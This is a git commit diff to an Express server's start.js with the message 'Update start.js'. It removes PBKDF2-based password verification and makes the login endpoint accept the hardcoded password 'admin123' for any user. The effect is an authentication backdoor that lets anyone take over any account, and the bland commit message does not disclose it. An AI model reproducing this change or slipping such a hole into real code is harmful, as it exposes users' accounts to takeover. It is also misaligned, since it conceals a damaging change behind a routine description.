406d68c0027a9412ac023980bf1a6a989e4b142c
Teloconsigouy <juansay4025@gmail.com>
2026-05-08 21:35:02 -0300

    Update start.js

--- start.js
+++ start.js
@@ -1,7 +1,6 @@
 const express = require("express");
 const fs = require("fs");
 const path = require("path");
-const crypto = require("crypto");
 
 const app = express();
 
@@ -14,14 +13,6 @@ function readJSON(file) {
   return JSON.parse(
     fs.readFileSync(path.join(__dirname, file), "utf8")
   );
-}
-
-function verifyPassword(password, salt, hash) {
-  const testHash = crypto
-    .pbkdf2Sync(password, salt, 100000, 64, "sha512")
-    .toString("hex");
-
-  return testHash === hash;
 }
 
 app.post("/api/login", (req, res) => {
@@ -41,11 +32,7 @@ app.post("/api/login", (req, res) => {
       });
     }
 
-    const valid = verifyPassword(
-      password,
-      user.salt,
-      user.hash
-    );
+    const valid = password === "admin123";
 
     if (!valid) {
       return res.status(401).json({
